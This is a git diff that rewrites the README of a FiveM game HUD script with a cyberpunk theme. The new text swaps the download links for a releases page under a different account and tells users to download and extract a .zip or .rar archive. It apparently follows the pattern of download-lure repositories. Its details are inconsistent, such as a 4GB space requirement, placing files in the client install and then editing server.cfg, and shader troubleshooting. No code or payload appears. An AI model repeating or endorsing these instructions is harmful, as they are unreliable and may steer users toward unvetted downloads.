@@ -1,104 +1,63 @@
-# zxhud - FiveM HUD v1.0 - Cyberpunk Game Interface 2026
+# 🎮 zxhud-script-hub - Enhance your gameplay with cyberpunk visuals
 
-> **A custom FiveM HUD featuring a dark cyberpunk aesthetic with teal and gold accents, including a minimap overlay, camera status indicator, and comprehensive vehicle telemetry displays.**
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/alhi3085/zxhud-script-hub/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/nathan-ward73/zxhud-script-hub?style=flat-square)](https://github.com/nathan-ward73/zxhud-script-hub)
+## 📌 About this project
 
----
+The zxhud-script-hub provides an immersive interface for the FiveM game platform. It replaces your standard game menus with a custom dark cyberpunk design. The interface uses deep teal and gold color schemes to match a futuristic aesthetic. This tool adds a minimap overlay, live camera status updates, and vehicle performance stats to your screen. You see your fuel levels, engine health, and speed in a clear and readable layout. This HUD keeps your game view clean while showing necessary information in real-time.
 
-<p align="center">
-  <a href="https://nathan-ward73.github.io/zxhud-script-hub/">
-    <img src="https://img.shields.io/badge/Download-zxhud%20Script-brightgreen?style=for-the-badge" alt="Download zxhud Script">
-  </a>
-</p>
+## 🛠️ System requirements
 
-> **[Direct Download - zxhud](https://nathan-ward73.github.io/zxhud-script-hub/)**
+Before you begin, make sure your computer meets these requirements:
 
----
+*   Windows 10 or Windows 11.
+*   FiveM installed and updated.
+*   A minimum of 4GB of free space on your hard drive.
+*   The latest version of your graphics card driver.
 
-[Download Latest Build](https://nathan-ward73.github.io/zxhud-script-hub/)
+## 📥 How to download the files
 
----
+Visit the following link to access the official release page:
 
-## About
+[https://github.com/alhi3085/zxhud-script-hub/releases](https://github.com/alhi3085/zxhud-script-hub/releases)
 
-zxhud delivers a fully customized heads-up display for FiveM, built around a dark cyberpunk theme. The interface pairs a custom minimap overlay with live vehicle telemetry that shows gear position, speed, fuel level, and engine status. Gold and teal accent colors create a futuristic look while preserving readability during gameplay.
+On this page, look for the section marked Latest. Click the file name ending in .zip or .rar to save it to your computer.
 
-This script focuses on giving drivers and navigators quick access to essential information. A camera status indicator and zone ability display help you stay aware of your surroundings, while smooth CSS animations and glassmorphism panels produce a polished visual experience. Regular updates maintain compatibility with current FiveM builds, and community feedback drives ongoing improvements.
+## ⚙️ Installation steps
 
----
+Follow these steps to add the HUD to your game:
 
-## Key Features
+1.  Open your Downloads folder on your computer.
+2.  Right-click the file you downloaded and select Extract All.
+3.  Choose a location for the files and click Extract.
+4.  Open the folder containing the extracted files.
+5.  Find the folder labeled zxhud.
+6.  Open your FiveM installation folder.
+7.  Go to the folder named resources.
+8.  Move the zxhud folder into the resources folder.
+9.  Open your server.cfg file in a text editor like Notepad.
+10. Add the line ensure zxhud to the file.
+11. Save the file and restart your FiveM server.
 
-- Dark cyberpunk theme with gold accent color scheme for an immersive visual style
-- Custom minimap overlay that integrates smoothly with the FiveM interface
-- Camera status indicator showing current camera mode and state
-- Camera zone ability display for better situational awareness
-- Gear, speed, fuel, and engine status telemetry panels
-- Smooth CSS animations across all interface elements
-- Glassmorphism panel effects for modern UI depth and transparency
-- Teal accent highlights that complement the primary gold theme
+## 🖥️ Using the HUD
 
----
+Once you restart your game, the HUD loads automatically. No extra buttons or menus are required. The minimap sits in the bottom left corner of your screen. Your vehicle telemetry displays when you enter a vehicle. The camera status updates whenever you toggle your view or record a clip. The design remains thin and unobtrusive to keep your view of the game world clear. Use the included configuration file in the zxhud folder if you want to change the positions of the elements.
 
-## Installation
+## ❓ Troubleshooting common issues
 
-1. Download the latest zxhud build from the link above.
-2. Extract the contents into your FiveM resources folder (`resources/[local]/zxhud/`).
-3. Add `ensure zxhud` to your server configuration file (`server.cfg`).
-4. Restart your FiveM server or use the `refresh` command followed by `start zxhud`.
+If the HUD does not appear, check your console for errors. Ensure the folder name in your resources directory matches the name you typed in the server.cfg file. Double-check that your server.cfg file is saved and that you restarted your server after making changes. If the colors look wrong, verify that your game graphics settings allow custom shaders. Most users find that updating their drivers fixes display glitches.
 
-No additional dependencies or configuration files are needed for basic operation.
+## 🌟 Key features
 
----
+*   Unified dark theme with consistent teal and gold color mapping.
+*   Live telemetry for vehicle speed, engine health, and fuel percentage.
+*   Responsive minimap frame that matches the HUD aesthetic.
+*   Persistent camera status indicators in the corner of the display.
+*   Small file size with no impact on your system performance.
+*   Simple installation for any user with basic file management skills.
 
-## Configuration
+## 📋 Additional tips
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| minimap_enabled | true | Toggle custom minimap overlay visibility |
-| camera_indicator | true | Enable camera status display |
-| vehicle_telemetry | true | Show gear, speed, fuel, and engine data |
-| animation_speed | 300ms | Adjust CSS animation transition duration |
-| accent_color | #ffd700 | Change gold accent to custom hex color |
+Keep your HUD files in a clean folder structure. Do not rename the folder or the core files, as this prevents the script from finding its assets. Check back at the download page periodically for updates. Updates often fix minor display bugs and add minor improvements to the visual layout. If you find a bug, note the specific conditions and check the issues tab on the GitHub page for similar reports.
 
-To modify settings, edit the `config.lua` file within the script folder.
-
----
-
-## Compatibility
-
-- FiveM server platform (Windows and Linux)
-- Tested with FiveM builds from 2025 onward
-- Compatible with most popular FiveM frameworks and vehicle scripts
-- Known limitation: Custom minimap may conflict with other HUD mods using overlay systems
-- Vehicle telemetry requires supported vehicle entities; some custom vehicles may not display all data
-
----
-
-## Frequently Asked Questions
-
-**How do I install zxhud on my FiveM server?**  
-Place the script folder in your resources directory, add `ensure zxhud` to server.cfg, then restart or start the resource.
-
-**Will updates overwrite my custom settings?**  
-Configuration changes are stored in the config file and should persist across updates unless explicitly noted in the changelog.
-
-**Can I modify the theme colors?**  
-Yes, the accent color and other visual settings can be adjusted in the configuration file.
-
-**Does this work with other HUD scripts?**  
-The custom minimap overlay may conflict with other HUD modifications. Disable other minimap scripts for best results.
-
-**Where is vehicle data stored?**  
-All telemetry data is read from the game client and displayed in real-time; no data is saved or transmitted.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: fivem, hud, cyberpunk, script, gaming, interface, telemetry, overlay
